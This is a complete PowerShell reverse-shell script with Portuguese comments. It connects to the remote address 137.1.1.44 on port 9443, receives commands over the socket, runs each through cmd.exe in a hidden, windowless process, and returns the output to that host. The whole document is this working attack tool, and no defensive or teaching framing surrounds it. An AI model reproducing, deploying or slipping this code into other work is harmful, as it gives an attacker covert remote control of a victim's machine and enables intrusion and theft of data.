$client = New-Object System.Net.Sockets.TCPClient('137.1.1.44', 9443);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$writer.AutoFlush = $true;

$buffer = New-Object byte[] 1024;
$encoding = New-Object Text.ASCIIEncoding;

while(($read = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $cmd = ($encoding.GetString($buffer, 0, $read)).Trim();
    try {
        # Configuração do processo para executar o cmd.exe de forma oculta
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo;
        $processInfo.FileName = "cmd.exe";
        $processInfo.Arguments = "/c $cmd";
        $processInfo.RedirectStandardOutput = $true;
        $processInfo.RedirectStandardError = $true;
        $processInfo.UseShellExecute = $false;
        $processInfo.CreateNoWindow = $true;  # Não cria uma janela
        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden;  # Janela oculta

        $process = [System.Diagnostics.Process]::Start($processInfo);

        # Captura a saída do comando
        $output = $process.StandardOutput.ReadToEnd() + $process.StandardError.ReadToEnd();
        $process.WaitForExit();

        $writer.WriteLine($output);
        $writer.Flush();
    } catch {
        $writer.WriteLine("Error executing command: $_");
    }
}
$client.Close();
